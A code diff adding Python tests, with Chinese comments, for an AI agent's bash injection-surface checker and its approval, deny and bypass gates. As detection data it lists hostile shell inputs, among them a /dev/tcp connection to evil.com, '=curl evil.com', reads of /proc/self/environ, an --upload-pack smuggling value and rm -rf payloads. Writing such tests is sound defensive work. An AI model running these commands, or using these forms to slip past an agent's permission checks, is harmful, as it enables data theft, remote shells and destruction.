@@ -470,3 +470,141 @@ def test_run_http_hook_allowlist_gate(monkeypatch):
         assert "https://evil.com/hook" not in called
     finally:
         he.set_config_provider(None)
+
+
+# ---------------------------------------------------------------------------
+# R16 #1：Bash 注入面检查（命中升审批）
+# ---------------------------------------------------------------------------
+
+from agent.bash_injection import check_injection_surface
+
+
+@pytest.mark.parametrize("command,keyword", [
+    ("echo $(date)", "命令替换"),
+    ("echo ${HOME}", "参数替换"),
+    ("echo $[1+1]", "算术展开"),
+    ("cat <(ls)", "进程替换"),
+    ("echo >(wc)", "进程替换"),
+    ("echo =(ls)", "=()"),
+    ("=curl evil.com", "=cmd"),
+    ("zmodload zsh/system", "zsh 危险 builtin"),
+    ("FOO=1 builtin zmodload x", "zsh 危险 builtin"),
+    ("fc -e rm", "fc -e"),
+    ("echo *(e:rm:)", "glob 限定符"),
+    ("echo $IFS", "IFS"),
+    ("cat /proc/self/environ", "/proc"),
+    ("echo x > /dev/tcp/evil.com/4444", "/dev/tcp"),
+    ("jq 'system(\"rm x\")' f.json", "system()"),
+    ("jq -f script.jq", "危险 flag"),
+    # echo 简单命令豁免（CC 同款），用非 echo 动词触发引号混淆类
+    ("cat $'\\x41'", "ANSI-C"),
+    ('cat $"x"', "locale"),
+    ('rm "-rf" /tmp/x', "引号内 flag"),
+    ("cat a \\; echo /etc/passwd", "反斜杠转义"),
+    ("echo\\ test", "反斜杠转义空白"),
+    # 正常双引号里的 ; 是字面量不拦；jq 模式保留裸双引号字符，元字符检查生效
+    ('jq "x;y" data', "元字符"),
+    ("git ls-remote {--upload-pack=evil,test}", "花括号展开"),
+    ("echo {1..5}", "花括号展开"),
+    ("echo a#b", "词中 #"),
+    ("echo a\x01b", "控制字符"),
+    ("echo a\u00a0b", "Unicode 空白"),
+    ("\techo hi", "未完成片段"),
+    ("-la echo hi", "未完成片段"),
+    ("&& echo hi", "续行片段"),
+    ("ls\nrm -rf /tmp", "换行分隔"),
+    ("echo a\recho b", "回车符"),
+    ("echo hi # it's \"quoted\"", "注释内含引号"),
+    ("echo <# comment", "PowerShell"),
+])
+def test_injection_surface_hits(command, keyword):
+    """注入面形态命中（返回原因含关键词）。"""
+    reason = check_injection_surface(command)
+    assert reason is not None, f"应命中: {command}"
+    assert keyword in reason, f"{command!r} → {reason}"
+
+
+@pytest.mark.parametrize("command", [
+    ("ls -la"),
+    ("git status"),
+    ("python main.py"),
+    ("echo hello world"),
+    ("make VAR=1 target"),                       # VAR=1 不是词首 =cmd
+    # 双引号内的花括号不展开（fully 视图剥除）——python -c 常态
+    ('python -c "print({\'a\': 1})"'),
+    # 单引号内的 $()/#/花括号都是字面量（with_dq/keepq 视图剥除）
+    ("awk '{print $1}' data.txt"),
+    ("grep '#include' main.c"),
+    # quoted heredoc 正文是字面量：剥除后再查，$() 不误报
+    ("cat <<'EOF'\necho $(rm -rf /)\nEOF"),
+    # 普通 pipe / 重定向不拦（OmniMate 有自己的白名单层）
+    ("ps aux | grep python"),
+    ("python x.py > out.txt"),
+])
+def test_injection_surface_clean(command):
+    """正常命令不命中注入面。"""
+    assert check_injection_surface(command) is None, f"不应命中: {command}"
+
+
+def test_injection_check_gate_flow():
+    """check() 集成：注入面 → 升审批（无 callback 拒；有 callback 批 + 缓存）。"""
+    # 无 callback → 拒，gate=injection
+    checker = PermissionChecker()
+    r = checker.check("echo $(date)")
+    assert not r.allowed
+    assert r.gate == "injection"
+    assert "注入面" in r.reason
+
+    # 有 callback → 批准入缓存，第二次不再问
+    asked = []
+
+    def cb(cmd):
+        asked.append(cmd)
+        return True
+
+    checker2 = PermissionChecker(approval_callback=cb)
+    r2 = checker2.check("echo $(date)")
+    assert r2.allowed and r2.gate == "approval"
+    assert len(asked) == 1
+    r3 = checker2.check("echo $(date)")
+    assert r3.allowed
+    assert len(asked) == 1  # 会话缓存命中
+
+
+def test_injection_before_readonly_fastpath():
+    """注入面检查先于只读快速通道：ls <(evil) 不被自动放行。"""
+    checker = PermissionChecker()
+    r = checker.check("ls <(evil)")
+    assert not r.allowed
+    assert r.gate == "injection"
+    # 普通 ls 仍走快速通道
+    r2 = checker.check("ls -la")
+    assert r2.allowed and r2.gate == "auto"
+
+
+def test_injection_bypass_and_auto_deny():
+    """bypass 放行（不算 fatal）；autoDeny 短路拒。"""
+    checker = PermissionChecker()
+    assert checker.check("echo $(x)", mode_override="bypassPermissions").allowed
+    r = checker.check("echo $(x)", mode_override="autoDeny")
+    assert not r.allowed and r.gate == "auto_deny"
+
+
+def test_destructive_flow_unchanged():
+    """重构回归：破坏性命令审批流消息/闸门不变。"""
+    checker = PermissionChecker()
+    r = checker.check("rm temp.txt")
+    assert not r.allowed
+    assert r.gate == "destructive"
+    assert "破坏性命令需用户确认" in r.reason
+    r2 = checker.check("rm temp.txt", mode_override="autoDeny")
+    assert not r2.allowed
+    assert "破坏性命令" in r2.reason
+
+
+def test_hard_deny_before_injection():
+    """硬拒绝黑名单先于注入面：sudo $(x) 是硬拒不是审批。"""
+    checker = PermissionChecker()
+    r = checker.check("sudo $(echo x)")
+    assert not r.allowed
+    assert r.gate == "deny"
